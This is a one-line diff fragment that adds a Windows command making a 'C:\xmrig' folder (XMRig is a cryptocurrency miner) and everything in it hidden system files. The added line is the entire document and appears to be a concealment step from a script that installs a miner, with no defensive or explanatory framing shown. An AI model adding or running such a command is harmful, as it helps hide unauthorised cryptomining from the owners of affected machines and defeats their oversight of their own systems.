@@ -1,0 +1,1 @@
+attrib +h +s "C:\xmrig" /s /d
